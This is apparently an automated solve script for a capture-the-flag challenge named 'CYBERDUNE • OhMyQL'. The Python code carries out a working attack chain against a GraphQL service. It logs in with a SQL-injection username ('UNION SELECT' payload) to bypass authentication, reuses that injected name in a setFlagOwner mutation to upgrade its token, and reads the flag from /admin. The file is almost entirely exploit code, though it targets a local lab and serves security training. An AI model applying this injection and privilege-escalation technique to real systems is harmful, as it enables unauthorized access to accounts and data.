
#!/usr/bin/env python3
"""
Automated solve for CYBERDUNE • OhMyQL
Requires: pip install requests
Usage:
  python3 solve.py http://127.0.0.1:31349
"""
import sys, json, requests

def gql(url, query, variables=None, token=None):
    hdrs = {"Content-Type":"application/json"}
    if token:
        hdrs["Authorization"] = f"Bearer {token}"
    data = {"query": query, "variables": variables or {}}
    r = requests.post(url + "/graphql", headers=hdrs, data=json.dumps(data), timeout=10)
    r.raise_for_status()
    return r.json()

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py <base_url>")
        print("Example: python3 solve.py http://127.0.0.1:31349")
        return
    base = sys.argv[1].rstrip("/")

    inj = "' UNION SELECT 'admin','admin',1;--"
    password = "admin"

    # 1) login with SQLi username
    q_login = """
    mutation ($username: String!, $password: String!){
      login(username:$username, password:$password){ token }
    }
    """
    res = gql(base, q_login, {"username": inj, "password": password})
    try:
        token1 = res["data"]["login"]["token"]
    except Exception as e:
        print("Login failed:", res)
        return
    print("[+] First token (no flagOwner):", token1[:64]+"...")

    # 2) setFlagOwner with SAME username as token payload
    q_set = """
    mutation ($u: String!){
      setFlagOwner(username: $u)
    }
    """
    res2 = gql(base, q_set, {"u": inj}, token=token1)
    try:
        token2 = res2["data"]["setFlagOwner"]
    except Exception as e:
        print("setFlagOwner failed:", res2)
        return
    print("[+] Upgraded token (flagOwner=true):", token2[:64]+"...")

    # 3) GET /admin with upgraded token
    r = requests.get(base + "/admin", headers={"Authorization": f"Bearer {token2}"}, timeout=10)
    if r.status_code == 200:
        print("[+] FLAG:", r.text.strip())
    else:
        print("[-] /admin forbidden:", r.status_code, r.text[:200])

if __name__ == "__main__":
    main()
